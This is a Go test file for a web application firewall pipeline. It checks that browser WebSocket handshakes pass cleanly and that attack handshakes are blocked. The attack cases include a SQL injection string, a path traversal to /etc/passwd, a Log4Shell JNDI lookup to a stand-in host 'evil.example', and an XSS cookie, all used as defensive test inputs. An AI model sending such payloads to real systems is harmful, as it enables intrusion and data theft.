// Copyright 2026 The Inkwall Authors
// SPDX-License-Identifier: Apache-2.0

package pipeline_test

import (
	"context"
	"net/http"
	"net/netip"
	"slices"
	"testing"
	"time"

	"github.com/inkwall-dev/inkwall/pkg/pipeline"
	"github.com/inkwall-dev/inkwall/pkg/request"
	"github.com/inkwall-dev/inkwall/pkg/rules/coraza"
)

// browserHandshake is a WebSocket handshake as Chrome sends it (no Accept
// header), with extra headers kv. Without Upgrade and Connection, it is
// what the engine sees through Traefik's ForwardAuth, which drops them.
func browserHandshake(proto, uri string, upgrade bool, kv ...string) *request.Request {
	h := http.Header{
		"Pragma":                   {"no-cache"},
		"Cache-Control":            {"no-cache"},
		"User-Agent":               {"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"},
		"Origin":                   {"https://app.example.com"},
		"Sec-Websocket-Version":    {"13"},
		"Accept-Encoding":          {"gzip, deflate, br, zstd"},
		"Accept-Language":          {"en-US,en;q=0.9"},
		"Cookie":                   {"session=4f1c2a9e0b7d"},
		"Sec-Websocket-Key":        {"x3J/HMbDL1EzLkh9+BhXDw=="},
		"Sec-Websocket-Extensions": {"permessage-deflate; client_max_window_bits"},
		"Sec-Websocket-Protocol":   {"chat, superchat"},
	}
	if upgrade {
		h.Set("Upgrade", "websocket")
		h.Set("Connection", "Upgrade")
	}
	for i := 0; i+1 < len(kv); i += 2 {
		h.Set(kv[i], kv[i+1])
	}
	return &request.Request{Proto: proto, Method: http.MethodGet, Scheme: "https", Host: "app.example.com",
		RawURI: uri, Headers: h, ClientIP: netip.MustParseAddr("198.51.100.7")}
}

// TestWebSocketHandshakeWithCRS: a browser's handshake, with or without
// the hop-by-hop headers, over HTTP/1.1 and HTTP/2, raises nothing at any
// paranoia level (#276).
func TestWebSocketHandshakeWithCRS(t *testing.T) {
	for pl := 1; pl <= 4; pl++ {
		eval, err := coraza.New(coraza.Config{ParanoiaLevel: pl})
		if err != nil {
			t.Fatal(err)
		}
		p := pipeline.New(eval, pipeline.Config{Mode: pipeline.ModeBlock, Timeout: 10 * time.Second})
		for _, proto := range []string{"HTTP/1.1", "HTTP/2.0"} {
			for _, upgrade := range []bool{true, false} {
				v := p.Check(context.Background(), browserHandshake(proto, "/chat?room=lobby", upgrade))
				if v.Action != pipeline.ActionAllow || len(v.RuleIDs) != 0 {
					t.Errorf("paranoia %d, %s, upgrade %v: action=%s reason=%s rules=%v score=%d, want a clean allow",
						pl, proto, upgrade, v.Action, v.Reason, v.RuleIDs, v.AnomalyScore)
				}
			}
		}
	}
}

// TestWebSocketHandshakeAttacks: the URL and the headers of a handshake
// are inspected as any request's, with the policy's WebSocket rules or
// without.
func TestWebSocketHandshakeAttacks(t *testing.T) {
	eval, err := coraza.New(coraza.Config{})
	if err != nil {
		t.Fatal(err)
	}
	ws, err := pipeline.CompileWebSocket(pipeline.WebSocketConfig{AllowedOrigins: []string{"https://app.example.com"}})
	if err != nil {
		t.Fatal(err)
	}
	tests := []struct {
		name string
		req  *request.Request
		rule int // a rule that must match
	}{
		{"sql injection in the query", browserHandshake("HTTP/1.1", "/chat?room=1%27%20OR%20%271%27%3D%271", true), 942100},
		{"path traversal", browserHandshake("HTTP/1.1", "/chat/../../../../etc/passwd", false), 930110},
		{"log4shell in the subprotocol", browserHandshake("HTTP/1.1", "/chat", true, "Sec-WebSocket-Protocol", "${jndi:ldap://evil.example/a}"), 944150},
		{"xss in a cookie", browserHandshake("HTTP/2.0", "/chat", false, "Cookie", "s=<script>alert(1)</script>"), 941100},
	}
	for _, rules := range []*pipeline.WebSocketRules{nil, ws} {
		p := pipeline.New(eval, pipeline.Config{Mode: pipeline.ModeBlock, Timeout: 10 * time.Second, WebSocket: rules})
		for _, tt := range tests {
			t.Run(tt.name, func(t *testing.T) {
				v := p.Check(context.Background(), tt.req)
				if v.Action != pipeline.ActionDeny || v.Status != http.StatusForbidden || !slices.Contains(v.RuleIDs, tt.rule) {
					t.Fatalf("action=%s status=%d rules=%v, want a 403 with rule %d", v.Action, v.Status, v.RuleIDs, tt.rule)
				}
			})
		}
	}
}
